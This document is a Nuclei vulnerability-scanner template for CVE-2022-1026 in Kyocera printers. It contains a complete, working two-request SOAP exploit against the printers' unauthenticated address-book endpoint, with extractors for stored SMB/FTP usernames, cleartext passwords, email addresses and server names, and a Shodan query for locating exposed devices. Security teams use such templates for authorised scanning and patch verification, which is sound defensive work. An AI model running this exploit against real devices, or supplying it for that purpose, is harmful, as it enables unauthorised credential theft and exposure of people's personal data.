CVE-2022-1026.yaml

id: CVE-2022-1026

info:
  name: Kyocera MFP - Unauthenticated Address Book Disclosure
  author: ushastoe
  severity: high
  description: |
    Kyocera MFP SOAP API on port 9091/TCP does not enforce authentication on the
    address book endpoint, allowing unauthenticated retrieval of cleartext FTP/SMB
    credentials and email addresses stored in the device address book.
  reference:
    - https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/
  classification:
    cve-id: CVE-2022-1026
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-306
  metadata:
    verified: true
    max-request: 2
    vendor: kyocera
    product: kyocera-mfp
    shodan-query: port:9091 "kyoceramita"
  tags: cve,cve2022,kyocera,printer,exposure,unauth,iot

# Step 1 — create address book enumeration object
# Step 2 — retrieve the address book using the token from step 1
flow: http(1) && sleep(5) && http(2)

http:
  - raw:
      - |
        POST /ws/km-wsdl/setting/address_book HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/soap+xml

        <?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>

    matchers:
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: enumeration
        internal: true
        regex:
          - '<[^:>]*:?enumeration>([^<]+)</[^:>]*:?enumeration>'
        group: 1

  - raw:
      - |
        POST /ws/km-wsdl/setting/address_book HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/soap+xml

        <?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{{enumeration}}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "personal_address"
          - "get_personal_address_listResponse"
        condition: or

    extractors:
      - type: regex
        name: smb_password
        part: body
        regex:
          - '<[^:>]*:?login_password>([^<]+)</[^:>]*:?login_password>'
        group: 1

      - type: regex
        name: smb_login
        part: body
        regex:
          - '<[^:>]*:?login_name>([^<]+)</[^:>]*:?login_name>'
        group: 1

      - type: regex
        name: email
        part: body
        regex:
          - '<[^:>]*:?(?:email_)?address>([^<@]+@[^<]+)</[^:>]*:?(?:email_)?address>'
        group: 1

      - type: regex
        name: ftp_server
        part: body
        regex:
          - '<[^:>]*:?server_name>([^<]+)</[^:>]*:?server_name>'
        group: 1
